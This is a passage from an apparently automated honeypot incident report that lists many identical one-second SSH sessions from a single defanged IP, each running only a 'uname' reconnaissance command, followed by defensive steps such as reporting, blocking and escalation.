| `2026-07-29 16:56:06` | `cowrie.session.params` |
| `2026-07-29 16:56:06` | `cowrie.command.input` |
| `2026-07-29 16:56:06` | `cowrie.log.closed` |
| `2026-07-29 16:56:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8984811988ca

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:11` | `cowrie.session.connect` |
| `2026-07-29 16:56:11` | `cowrie.client.version` |
| `2026-07-29 16:56:12` | `cowrie.client.kex` |
| `2026-07-29 16:56:12` | `cowrie.login.success` |
| `2026-07-29 16:56:13` | `cowrie.session.params` |
| `2026-07-29 16:56:13` | `cowrie.command.input` |
| `2026-07-29 16:56:13` | `cowrie.log.closed` |
| `2026-07-29 16:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65e51ba07fcf

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:18` | `cowrie.session.connect` |
| `2026-07-29 16:56:18` | `cowrie.client.version` |
| `2026-07-29 16:56:18` | `cowrie.client.kex` |
| `2026-07-29 16:56:18` | `cowrie.login.success` |
| `2026-07-29 16:56:19` | `cowrie.session.params` |
| `2026-07-29 16:56:19` | `cowrie.command.input` |
| `2026-07-29 16:56:19` | `cowrie.log.closed` |
| `2026-07-29 16:56:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f69c94b58d9d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:24` | `cowrie.session.connect` |
| `2026-07-29 16:56:24` | `cowrie.client.version` |
| `2026-07-29 16:56:24` | `cowrie.client.kex` |
| `2026-07-29 16:56:24` | `cowrie.login.success` |
| `2026-07-29 16:56:25` | `cowrie.session.params` |
| `2026-07-29 16:56:25` | `cowrie.command.input` |
| `2026-07-29 16:56:25` | `cowrie.log.closed` |
| `2026-07-29 16:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92b473bda858

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:30` | `cowrie.session.connect` |
| `2026-07-29 16:56:30` | `cowrie.client.version` |
| `2026-07-29 16:56:30` | `cowrie.client.kex` |
| `2026-07-29 16:56:30` | `cowrie.login.success` |
| `2026-07-29 16:56:31` | `cowrie.session.params` |
| `2026-07-29 16:56:31` | `cowrie.command.input` |
| `2026-07-29 16:56:31` | `cowrie.log.closed` |
| `2026-07-29 16:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49992c23a63b

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:35` | `cowrie.session.connect` |
| `2026-07-29 16:56:35` | `cowrie.client.version` |
| `2026-07-29 16:56:35` | `cowrie.client.kex` |
| `2026-07-29 16:56:36` | `cowrie.login.success` |
| `2026-07-29 16:56:36` | `cowrie.session.params` |
| `2026-07-29 16:56:36` | `cowrie.command.input` |
| `2026-07-29 16:56:36` | `cowrie.log.closed` |
| `2026-07-29 16:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b87f5eb9196

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:41` | `cowrie.session.connect` |
| `2026-07-29 16:56:41` | `cowrie.client.version` |
| `2026-07-29 16:56:41` | `cowrie.client.kex` |
| `2026-07-29 16:56:42` | `cowrie.login.success` |
| `2026-07-29 16:56:42` | `cowrie.session.params` |
| `2026-07-29 16:56:42` | `cowrie.command.input` |
| `2026-07-29 16:56:43` | `cowrie.log.closed` |
| `2026-07-29 16:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a97b54c5fd97

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:47` | `cowrie.session.connect` |
| `2026-07-29 16:56:47` | `cowrie.client.version` |
| `2026-07-29 16:56:47` | `cowrie.client.kex` |
| `2026-07-29 16:56:47` | `cowrie.login.success` |
| `2026-07-29 16:56:48` | `cowrie.session.params` |
| `2026-07-29 16:56:48` | `cowrie.command.input` |
| `2026-07-29 16:56:48` | `cowrie.log.closed` |
| `2026-07-29 16:56:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d053d4aa80d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:53` | `cowrie.session.connect` |
| `2026-07-29 16:56:53` | `cowrie.client.version` |
| `2026-07-29 16:56:53` | `cowrie.client.kex` |
| `2026-07-29 16:56:53` | `cowrie.login.success` |
| `2026-07-29 16:56:54` | `cowrie.session.params` |
| `2026-07-29 16:56:54` | `cowrie.command.input` |
| `2026-07-29 16:56:54` | `cowrie.log.closed` |
| `2026-07-29 16:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60e6767d2904

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:56 |
| **Last Seen** | 2026-07-29 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:56:58` | `cowrie.session.connect` |
| `2026-07-29 16:56:58` | `cowrie.client.version` |
| `2026-07-29 16:56:58` | `cowrie.client.kex` |
| `2026-07-29 16:56:59` | `cowrie.login.success` |
| `2026-07-29 16:57:00` | `cowrie.session.params` |
| `2026-07-29 16:57:00` | `cowrie.command.input` |
| `2026-07-29 16:57:00` | `cowrie.log.closed` |
| `2026-07-29 16:57:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ebe3cfea0b6

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:57 |
| **Last Seen** | 2026-07-29 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:57:04` | `cowrie.session.connect` |
| `2026-07-29 16:57:04` | `cowrie.client.version` |
| `2026-07-29 16:57:05` | `cowrie.client.kex` |
| `2026-07-29 16:57:05` | `cowrie.login.success` |
| `2026-07-29 16:57:05` | `cowrie.session.params` |
| `2026-07-29 16:57:05` | `cowrie.command.input` |
| `2026-07-29 16:57:06` | `cowrie.log.closed` |
| `2026-07-29 16:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7831ce507736

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:57 |
| **Last Seen** | 2026-07-29 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:57:11` | `cowrie.session.connect` |
| `2026-07-29 16:57:11` | `cowrie.client.version` |
| `2026-07-29 16:57:11` | `cowrie.client.kex` |
| `2026-07-29 16:57:12` | `cowrie.login.success` |
| `2026-07-29 16:57:13` | `cowrie.session.params` |
| `2026-07-29 16:57:13` | `cowrie.command.input` |
| `2026-07-29 16:57:13` | `cowrie.log.closed` |
| `2026-07-29 16:57:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef18d6073ad3

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:57 |
| **Last Seen** | 2026-07-29 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:57:19` | `cowrie.session.connect` |
| `2026-07-29 16:57:19` | `cowrie.client.version` |
| `2026-07-29 16:57:19` | `cowrie.client.kex` |
| `2026-07-29 16:57:19` | `cowrie.login.success` |
| `2026-07-29 16:57:20` | `cowrie.session.params` |
| `2026-07-29 16:57:20` | `cowrie.command.input` |
| `2026-07-29 16:57:20` | `cowrie.log.closed` |
| `2026-07-29 16:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea2c59088e5e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:57 |
| **Last Seen** | 2026-07-29 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:57:26` | `cowrie.session.connect` |
| `2026-07-29 16:57:26` | `cowrie.client.version` |
| `2026-07-29 16:57:26` | `cowrie.client.kex` |
| `2026-07-29 16:57:27` | `cowrie.login.success` |
| `2026-07-29 16:57:27` | `cowrie.session.params` |
| `2026-07-29 16:57:27` | `cowrie.command.input` |
| `2026-07-29 16:57:28` | `cowrie.log.closed` |
| `2026-07-29 16:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d432cab6806e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:57 |
| **Last Seen** | 2026-07-29 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:57:33` | `cowrie.session.connect` |
| `2026-07-29 16:57:33` | `cowrie.client.version` |
| `2026-07-29 16:57:33` | `cowrie.client.kex` |
| `2026-07-29 16:57:34` | `cowrie.login.success` |
| `2026-07-29 16:57:35` | `cowrie.session.params` |
| `2026-07-29 16:57:35` | `cowrie.command.input` |
| `2026-07-29 16:57:35` | `cowrie.log.closed` |
| `2026-07-29 16:57:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4747c7c2540

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:57 |
| **Last Seen** | 2026-07-29 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:57:41` | `cowrie.session.connect` |
| `2026-07-29 16:57:41` | `cowrie.client.version` |
| `2026-07-29 16:57:41` | `cowrie.client.kex` |
| `2026-07-29 16:57:41` | `cowrie.login.success` |
| `2026-07-29 16:57:42` | `cowrie.session.params` |
| `2026-07-29 16:57:42` | `cowrie.command.input` |
| `2026-07-29 16:57:42` | `cowrie.log.closed` |
| `2026-07-29 16:57:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89d473ac1108

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:57 |
| **Last Seen** | 2026-07-29 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:57:47` | `cowrie.session.connect` |
| `2026-07-29 16:57:47` | `cowrie.client.version` |
| `2026-07-29 16:57:47` | `cowrie.client.kex` |
| `2026-07-29 16:57:47` | `cowrie.login.success` |
| `2026-07-29 16:57:48` | `cowrie.session.params` |
| `2026-07-29 16:57:48` | `cowrie.command.input` |
| `2026-07-29 16:57:48` | `cowrie.log.closed` |
| `2026-07-29 16:57:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4820aeff5fc

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:57 |
| **Last Seen** | 2026-07-29 16:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:57:54` | `cowrie.session.connect` |
| `2026-07-29 16:57:54` | `cowrie.client.version` |
| `2026-07-29 16:57:54` | `cowrie.client.kex` |
| `2026-07-29 16:57:54` | `cowrie.login.success` |
| `2026-07-29 16:57:55` | `cowrie.session.params` |
| `2026-07-29 16:57:55` | `cowrie.command.input` |
| `2026-07-29 16:57:55` | `cowrie.log.closed` |
| `2026-07-29 16:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f508148d3a2

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:58 |
| **Last Seen** | 2026-07-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:58:00` | `cowrie.session.connect` |
| `2026-07-29 16:58:00` | `cowrie.client.version` |
| `2026-07-29 16:58:00` | `cowrie.client.kex` |
| `2026-07-29 16:58:01` | `cowrie.login.success` |
| `2026-07-29 16:58:02` | `cowrie.session.params` |
| `2026-07-29 16:58:02` | `cowrie.command.input` |
| `2026-07-29 16:58:02` | `cowrie.log.closed` |
| `2026-07-29 16:58:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c31b13e8ea57

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:58 |
| **Last Seen** | 2026-07-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:58:07` | `cowrie.session.connect` |
| `2026-07-29 16:58:07` | `cowrie.client.version` |
| `2026-07-29 16:58:07` | `cowrie.client.kex` |
| `2026-07-29 16:58:08` | `cowrie.login.success` |
| `2026-07-29 16:58:08` | `cowrie.session.params` |
| `2026-07-29 16:58:08` | `cowrie.command.input` |
| `2026-07-29 16:58:09` | `cowrie.log.closed` |
| `2026-07-29 16:58:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b45cfadeac40

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:58 |
| **Last Seen** | 2026-07-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:58:14` | `cowrie.session.connect` |
| `2026-07-29 16:58:14` | `cowrie.client.version` |
| `2026-07-29 16:58:14` | `cowrie.client.kex` |
| `2026-07-29 16:58:15` | `cowrie.login.success` |
| `2026-07-29 16:58:16` | `cowrie.session.params` |
| `2026-07-29 16:58:16` | `cowrie.command.input` |
| `2026-07-29 16:58:16` | `cowrie.log.closed` |
| `2026-07-29 16:58:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3ef3f39c649

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:58 |
| **Last Seen** | 2026-07-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:58:20` | `cowrie.session.connect` |
| `2026-07-29 16:58:20` | `cowrie.client.version` |
| `2026-07-29 16:58:20` | `cowrie.client.kex` |
| `2026-07-29 16:58:21` | `cowrie.login.success` |
| `2026-07-29 16:58:21` | `cowrie.session.params` |
| `2026-07-29 16:58:21` | `cowrie.command.input` |
| `2026-07-29 16:58:22` | `cowrie.log.closed` |
| `2026-07-29 16:58:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b375c605c985

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:58 |
| **Last Seen** | 2026-07-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:58:27` | `cowrie.session.connect` |
| `2026-07-29 16:58:27` | `cowrie.client.version` |
| `2026-07-29 16:58:28` | `cowrie.client.kex` |
| `2026-07-29 16:58:28` | `cowrie.login.success` |
| `2026-07-29 16:58:29` | `cowrie.session.params` |
| `2026-07-29 16:58:29` | `cowrie.command.input` |
| `2026-07-29 16:58:29` | `cowrie.log.closed` |
| `2026-07-29 16:58:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541eb6af38ad

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:58 |
| **Last Seen** | 2026-07-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:58:35` | `cowrie.session.connect` |
| `2026-07-29 16:58:35` | `cowrie.client.version` |
| `2026-07-29 16:58:35` | `cowrie.client.kex` |
| `2026-07-29 16:58:35` | `cowrie.login.success` |
| `2026-07-29 16:58:36` | `cowrie.session.params` |
| `2026-07-29 16:58:36` | `cowrie.command.input` |
| `2026-07-29 16:58:36` | `cowrie.log.closed` |
| `2026-07-29 16:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b0fc3bd9cfc

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:58 |
| **Last Seen** | 2026-07-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:58:42` | `cowrie.session.connect` |
| `2026-07-29 16:58:42` | `cowrie.client.version` |
| `2026-07-29 16:58:42` | `cowrie.client.kex` |
| `2026-07-29 16:58:42` | `cowrie.login.success` |
| `2026-07-29 16:58:43` | `cowrie.session.params` |
| `2026-07-29 16:58:43` | `cowrie.command.input` |
| `2026-07-29 16:58:43` | `cowrie.log.closed` |
| `2026-07-29 16:58:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1fc1d22ddaa

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:58 |
| **Last Seen** | 2026-07-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-29 16:58:49` | `cowrie.session.connect` |
| `2026-07-29 16:58:49` | `cowrie.client.version` |
| `2026-07-29 16:58:49` | `cowrie.client.kex` |
| `2026-07-29 16:58:49` | `cowrie.login.success` |
| `2026-07-29 16:58:50` | `cowrie.session.params` |
| `2026-07-29 16:58:50` | `cowrie.command.input` |
| `2026-07-29 16:58:50` | `cowrie.log.closed` |
| `2026-07-29 16:58:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]235` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06bcf337d3e7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]235` |
| **First Seen** | 2026-07-29 16:58 |
| **Last Seen** | 2026-07-29 16:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
